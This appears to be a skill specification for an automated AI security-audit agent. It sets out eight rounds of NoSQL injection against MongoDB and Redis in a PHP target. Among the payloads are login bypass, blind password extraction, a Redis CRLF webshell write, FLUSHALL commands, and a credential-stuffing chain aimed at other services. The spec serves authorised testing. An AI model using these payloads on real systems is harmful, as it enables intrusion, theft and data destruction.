## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-051-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 8-round progressive attack against NoSQL injection (MongoDB/Redis) sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |
## 8-Round Attack


#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R1 - Operator Injection (Authentication Bypass)

Objective: Bypass authentication via MongoDB operator injection.

Common insecure patterns in PHP applications:
```php
$user = $collection->findOne([
    'username' => $_POST['username'],
    'password' => $_POST['password']
]);
```

Payload (HTTP parameter form):
- `username[$ne]=x&password[$ne]=x` → Query becomes `{username: {$ne: "x"}, password: {$ne: "x"}}` → Returns the first user
- `username=admin&password[$gt]=` → Password greater than empty string → Matches any password
- `username=admin&password[$regex]=.*` → Regex matches any password
- `username[$in][]=admin&username[$in][]=root&password[$ne]=x` → Matches admin or root

JSON body form:
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}
```

**Success criteria:** Authentication passed without knowing the password.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - $where JavaScript Injection

Objective: Execute JavaScript code via the `$where` operator.

Payload:
- `$where=this.username=='admin'`
- `$where=function(){return this.password.match(/^a/)}` → Character-by-character password leak
- `$where=1; sleep(5000)` → Time-based blind injection
- `$where=this.constructor.constructor('return process')().exit()` → DoS

Boolean blind injection to leak password:
```bash
# Character-by-character guessing
for c in {a..z} {A..Z} {0..9}; do
  resp=$(curl -s "http://nginx:80/api/search?where=this.password.match(/^${known}${c}/)")
  if echo "$resp" | grep -q "found"; then
    echo "Next char: $c"
    break
  fi
done
```

**Success criteria:** JavaScript code execution or data leakage.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - $regex ReDoS and Data Extraction

Objective: Leverage the `$regex` operator for data extraction or ReDoS.

Payload:
- Data extraction (boolean blind injection):
  ```
  username[$regex]=^a → Has results → First character is a
  username[$regex]=^ad → Has results → First two characters are ad
  username[$regex]=^adm → Has results → First three characters are adm
  ```
- ReDoS:
  ```
  username[$regex]=(a+)+$&username=aaaaaaaaaaaaaaaaaa!
  ```
- Special character exploitation:
  ```
  username[$regex]=.*&password[$regex]=^(?=a).*$  → Password first character probing
  ```

**Success criteria:** Character-by-character extraction of username or password, or service delay caused by ReDoS.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - Aggregation Pipeline Injection

Objective: Inject into MongoDB aggregation pipeline operations.

When user input enters `aggregate()`:
```php
$pipeline = [['$match' => ['status' => $_GET['status']]]];
$results = $collection->aggregate($pipeline);
```

Payload:
- `$lookup` injection to access other collections:
  ```json
  [{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "stolen"}}]
  ```
- `$group` injection to aggregate sensitive data:
  ```json
  [{"$group": {"_id": null, "passwords": {"$push": "$password"}}}]
  ```
- `$out` injection to write to a new collection:
  ```json
  [{"$out": "public_dump"}]
  ```

**Success criteria:** Unauthorized collection or field access via aggregation pipeline.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - JSON Parameter Pollution

Objective: Exploit PHP's `json_decode()` and array merge behavior.

PHP-specific scenario:
```php
// Dangerous: json_decode result used directly as query conditions
$filter = json_decode(file_get_contents('php://input'), true);
$results = $collection->find($filter);
```

Payload:
- Send operators directly:
  ```json
  {"$or": [{"username": "admin"}, {"$where": "1==1"}]}
  ```
- Exploit `array_merge()` override behavior:
  ```json
  {"username": "admin", "$or": [{"password": {"$exists": true}}]}
  ```
- PHP array to BSON type conversion differences

**Success criteria:** Injected MongoDB operators are parsed and executed.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Redis Command Injection

Objective: Perform command injection on Redis operations.

When key names or values are controllable:
```php
$redis->get("user:" . $_GET['id']);  // Key name injection
$redis->eval($script, [$_GET['key']]);  // Lua injection
```

Payload:
- **CRLF injection** (native protocol):
  ```
  id=x\r\nFLUSHALL\r\n
  id=x\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload "<?php system($_GET[c]);?>"\r\nBGSAVE\r\n
  ```
- **Lua script injection**:
  ```
  key=x"; redis.call("FLUSHALL"); --
  ```
- **Pub/Sub message injection**: Controllable channel names or message content

**Success criteria:** Redis commands are executed (keys disappear after FLUSHALL, or a Webshell is written).


#### R7 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R7 - ORM Layer Bypass (Laravel MongoDB)

Objective: Bypass the jenssegers/laravel-mongodb ORM query builder.

Checkpoints:
```php
// Safe: ORM methods
User::where('email', $email)->first();

// Unsafe: Operators passed via array
User::where('email', $request->input('email'))->first();
// If email={"$ne": ""} → Operator injection

// Unsafe: whereRaw
User::whereRaw(['$where' => 'this.role=="admin"'])->get();
```

Payload:
- `email[$ne]=` → `where('email', ['$ne' => ''])` → Matches all
- `sort[$password]=1` → Infer password via sorting
- `fields[$password]=1` → Leak password field via projection
- `limit=99999` → Bulk data exfiltration

**Success criteria:** Unauthorized data access via operator injection through the ORM layer.


#### R8 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R8 - Combined Attack Chains

1. **Operator injection → Authentication bypass → Admin access**: `$ne` login → Obtain admin Session → Access administrative functions
2. **$regex blind injection → Password extraction → Credential stuffing**: Character-by-character extraction → Recover plaintext password → Send credential requests to test other services
3. **Redis CRLF → Webshell write → RCE**: Key name injection → CONFIG SET → Write file → Command execution
4. **Aggregation pipeline injection → Cross-collection data leak → Credential theft**: `$lookup` → Read sessions collection → Hijack Session
5. **JSON pollution → Bulk deletion → Data destruction**: `$or` + `deleteMany` → Delete all matching records

**Success criteria:** Complete NoSQL injection exploitation chain.

## Evidence Collection

### MongoDB Injection Confirmation
```bash
# Operator injection: Login success returns user data
docker exec php curl -s -X POST http://nginx:80/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
# Returns user object → confirmed

# Time-based blind injection: $where sleep
time docker exec php curl -s "http://nginx:80/api/search?where=sleep(5000)"
# Response > 5s → confirmed
```

### Redis Injection Confirmation
```bash
# Post-command execution check
docker exec redis redis-cli INFO server
docker exec php ls /var/www/html/shell.php
```

Evidence standards:
- Operator injection bypasses authentication and returns user data → **confirmed**
- $where time-based blind injection delay > configured value → **confirmed**
- Redis command executed successfully (keys deleted / files written) → **confirmed**
- Only request parameter format anomaly with no clear impact → **suspected**

## Physical Evidence Requirements

| Evidence Type | Example |
|---|---|
| Authentication bypass | `{"$ne":""}` login returns admin user object |
| Data leakage | `$regex` blind injection extracts password `p@ssw0rd` |
| Command execution | Redis CRLF writes Webshell successfully |
| Cross-collection access | `$lookup` returns sessions collection data |

## Report Format

```json
{
  "vuln_type": "NoSQLi",
  "sub_type": "operator_injection|js_injection|regex_extraction|aggregation_injection|redis_injection|orm_bypass",
  "round": 1,
  "endpoint": "POST /api/login",
  "database": "MongoDB|Redis",
  "payload": "{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}",
  "evidence": "Returned user object: {\"_id\":\"...\",\"username\":\"admin\",\"role\":\"admin\"}",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Authentication bypass|Data leakage|Command execution",
  "remediation": "Force type casting of user input to string, prohibit operators from being passed via parameters, use parameterized queries, disable EVAL/CONFIG in Redis"
}
```

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential NoSQL injection vulnerabilities:
- Pattern 1: `$collection->find(['username' => $_POST['user'], 'password' => $_POST['pass']])` — When POST sends `password[$ne]=x`, it triggers operator injection to bypass authentication
- Pattern 2: `$collection->find(['username' => ['$regex' => $input]])` — MongoDB `$regex` injection, attacker can enumerate data character by character (`^a`, `^ab`, `^abc`...)
- Pattern 3: `$collection->find(['$where' => "this.username == '" . $input . "'"])` — `$where` accepts JavaScript expressions, allowing arbitrary JS code injection
- Pattern 4: `$redis->eval($luaScript)` / `$redis->rawCommand($userInput)` — Redis Lua script injection or raw command injection
- Pattern 5: `$redis->set($userControlledKey, $value)` — Redis key name is controllable, can overwrite Session/cache keys for privilege escalation
- Pattern 6: `Model::whereRaw(['field' => $request->input('filter')])` — Laravel MongoDB ORM's whereRaw receives user-controllable arrays

## Key Insight

> **Key point**: The core of NoSQL injection lies in PHP's array parameter passing mechanism — `$_GET['param'][$ne]=x` is automatically constructed as `['param' => ['$ne' => 'x']]`, enabling MongoDB operator injection without any special encoding. When auditing, first locate whether MongoDB query function parameters come directly from `$_GET`/`$_POST` (which allow arrays), then trace `$where`/`$regex` usage scenarios, and finally examine user controllability of Redis key names and Lua scripts.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Reconnaissance: Re-read target code to find overlooked filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other specialists
3. Decision tree matching: Select new attack directions based on failure patterns in `shared/pivot_strategy.md`
4. Terminate early when no new paths are found to avoid wasting rounds producing hallucinated results

## Prerequisites and Scoring (MUST be completed)

The output `exploits/{sink_id}.json` MUST contain the following two objects:

### prerequisite_conditions (Prerequisites)
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for this route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RCE-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract References (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_NOSQL_QUERY_CONSTRUCTION` — NoSQL query construction location ✅ Required
- `EVID_NOSQL_USER_INPUT_MAPPING` — User input to query mapping ✅ Required
- `EVID_NOSQL_OPERATOR_INJECTION` — Operator injection point ✅ Required
- `EVID_NOSQL_QUERY_SEMANTIC_DIFF` — Query semantic difference evidence (required for confirmed)

Missing required EVID → Conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` for write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format specified in `shared/data_contracts.md` Section 9 (`exploit_result.json`).

## Collaboration

- Pass Redis file write capabilities to the File Write Auditor
- Pass credentials leaked via MongoDB to the Authorization Auditor
- Submit all findings to the QA Reviewer for physical evidence verification

## Real-time Sharing and Second-Order Tracking

### Shared Write
Data obtained via NoSQL injection **MUST** be written to the shared findings store (`$WORK_DIR/audit_session.db`):
- Extracted credentials/tokens → `finding_type: credential`

### Shared Read
Read the shared findings store before starting the attack phase to leverage internal Redis/MongoDB addresses discovered by SSRF.

## Constraints

- Create a snapshot (BGSAVE) before Redis testing, restore after testing
- MongoDB testing MUST NOT use `$out` to write to production collections
- Enumeration limit: $regex blind injection extracts at most 100 characters
- Do NOT execute FLUSHALL/FLUSHDB; describe only as PoC


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

### ✅ GOOD Output Example

```json
{
  "sink_id": "NOSQL-001",
  "vuln_type": "NoSQLi",
  "sub_type": "operator_injection",
  "final_verdict": "confirmed",
  "rounds_executed": 4,
  "confirmed_round": 1,
  "endpoint": "POST /api/login",
  "payload": "{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}",
  "evidence": "EVID_NOSQL_QUERY_CONSTRUCTION: UserController.php:32 — $collection->findOne(['username'=>$_POST['username'],'password'=>$_POST['password']]); EVID_NOSQL_USER_INPUT_MAPPING: $_POST array directly used as query filter; EVID_NOSQL_OPERATOR_INJECTION: {$ne:''} injected via POST body; EVID_NOSQL_QUERY_SEMANTIC_DIFF: Normal returns null, injected returns {_id:'...', username:'admin', role:'admin'}",
  "confidence": "confirmed",
  "impact": "Authentication bypass — login as admin without password",
  "prerequisite_conditions": { "auth_requirement": "anonymous", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 3, "impact": 3, "complexity": 3, "score": 3.0, "cvss": 10.0, "level": "C" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "NOSQL-001",
  "vuln_type": "NoSQLi",
  "final_verdict": "confirmed",
  "evidence": "Might be vulnerable to NoSQL injection",
  "severity": { "score": 3.0, "level": "C" }
}
// ❌ Missing sub_type, rounds_executed, endpoint, payload
// ❌ evidence is vague — no EVID references, no concrete response data
// ❌ severity missing reachability/impact/complexity and reasons
// ❌ No prerequisite_conditions
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); continue only after all are ✅
2. Execute the specialized self-check items below (S1-S3); submit only after all are ✅
3. Any item ❌ → Correct and re-check; MUST NOT skip

### Specialized Self-Check (NoSQL Auditor Specific)
- [ ] S1: NoSQL injection type (MongoDB operator / JSON injection / JavaScript injection) has been labeled
- [ ] S2: User input concatenation position in query construction has been precisely annotated
- [ ] S3: Specific payloads for array parameter bypass (\$gt/\$ne/\$regex) have been demonstrated

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| NoSQL query operator injection blocked by input validation | Switch to JSON-based or array-based injection; if blocked → record `"status": "input_validated"` |
| Database connection lost during exploitation | Reconnect and retry current round; if 2nd failure → record `"status": "db_connection_lost"` |
| No valid injection point found | Record `"status": "no_injection_point"`, set `final_verdict: "not_vulnerable"` |
| Authentication token expired mid-attack | Re-fetch credentials from auth_credentials.json, retry current round |
